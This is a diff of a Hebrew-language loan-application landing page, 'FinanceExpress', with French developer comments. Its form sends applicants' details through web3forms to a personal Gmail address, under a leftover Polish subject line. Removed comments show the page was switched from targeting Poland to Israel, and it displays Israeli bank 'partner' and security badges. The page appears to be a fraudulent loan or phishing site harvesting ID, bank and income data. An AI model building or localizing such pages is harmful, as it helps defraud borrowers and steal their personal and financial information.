@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- TOUS LES STYLES (avec animations ajoutées) --- */
+        /* --- STYLES COMPLETS (inchangés) --- */
         :root {
             --primary: #0f172a;
             --primary-light: #1e293b;
@@ -138,7 +138,7 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
 
-        /* --- NOUVELLES ANIMATIONS ET STYLES BANCAIRES --- */
+        /* --- ANIMATIONS BANCAIRES --- */
         @keyframes float {
             0% { transform: translateY(0px); }
             50% { transform: translateY(-8px); }
@@ -165,9 +165,7 @@
             justify-content: center;
             gap: 10px;
         }
-        .partner-title i {
-            color: #0038b8; /* Bleu israélien */
-        }
+        .partner-title i { color: #0038b8; }
         .partner-logos {
             display: flex;
             justify-content: center;
@@ -199,15 +197,8 @@
             box-shadow: var(--shadow-lg);
             animation-play-state: paused;
         }
-        .partner-card i {
-            color: var(--secondary);
-            font-size: 1.1rem;
-        }
-        .partner-card .israel-star {
-            color: #0038b8;
-            font-size: 0.7rem;
-            margin-right: 2px;
-        }
+        .partner-card i { color: var(--secondary); font-size: 1.1rem; }
+        .partner-card .israel-star { color: #0038b8; font-size: 0.7rem; margin-right: 2px; }
         .secure-badge {
             margin-top: 18px;
             font-size: 0.85rem;
@@ -218,10 +209,7 @@
             gap: 8px;
             animation: pulse-shadow 2s infinite;
         }
-        .secure-badge i {
-            color: var(--success);
-            font-size: 1.1rem;
-        }
+        .secure-badge i { color: var(--success); font-size: 1.1rem; }
 
         @media (max-width: 992px) {
             .hero-container, .steps-grid, .features-grid, .testimonials-grid, .footer-grid, .proof-images { grid-template-columns: 1fr; }
@@ -289,12 +277,12 @@
                 <div class="hero-form-container">
                     <h3 style="text-align: center; margin-bottom: 24px; font-size: 1.5rem;">מלא את הבקשה</h3>
                     
-                    <!-- Formulaire avec redirection corrigée -->
+                    <!-- ===== FORMULAIRE AVEC REDIRECTION VERS MERCI.HTML ===== -->
                     <form action="https://api.web3forms.com/submit" method="POST">
                         <input type="hidden" name="access_key" value="c2552c68-8921-4ef2-bbc4-5a41a058b5f5">
                         <input type="hidden" name="to_email" value="bankvantex047@gmail.com">
                         <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
-                        <!-- Redirection corrigée vers merci.html -->
+                        <!-- ⚠️ REDIRECTION OBLIGATOIRE VERS VOTRE PAGE DE REMERCIEMENT -->
                         <input type="hidden" name="redirect" value="https://monika-source.github.io/Monil/merci.html">
                         
                         <div class="form-grid">
@@ -365,8 +353,9 @@
                             <i class="fas fa-paper-plane"></i> שלח בקשה
                         </button>
                     </form>
+                    <!-- ========================================================= -->
 
-                    <!-- === NOUVELLE SECTION BANCAIRE ISRAÉLIENNE (EN BAS DU FORMULAIRE) === -->
+                    <!-- SECTION BANCAIRE ISRAÉLIENNE -->
                     <div class="bank-partners">
                         <div class="partner-title">
                             <i class="fas fa-star-of-david"></i>
@@ -401,7 +390,7 @@
                             <i class="fas fa-lock"></i>
                         </div>
                     </div>
-                    <!-- ====================================================== -->
+                    <!-- FIN SECTION BANCAIRE -->
 
                 </div>
             </div>
@@ -437,7 +426,6 @@
             <div class="container">
                 <div class="section-header">
                     <h2 class="section-title">למה כדאי לסמוך עלינו?</h2>
-                    <!-- REMPLACÉ "Pologne" par "Israël" -->
                     <p class="section-subtitle">אנחנו מובילים בשוק ההלוואות הפרטיות המקוונות בישראל.</p>
                 </div>
                 <div class="features-grid">
@@ -519,7 +507,6 @@
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <!-- REMPLACÉ "Polonaise" par "Israélienne" -->
                         <p>כל אדם בגיר בעל אזרחות ישראלית, תעודת זהות בתוקף, חשבון בנק והכנסה קבועה.</p>
                     </div>
                 </div>
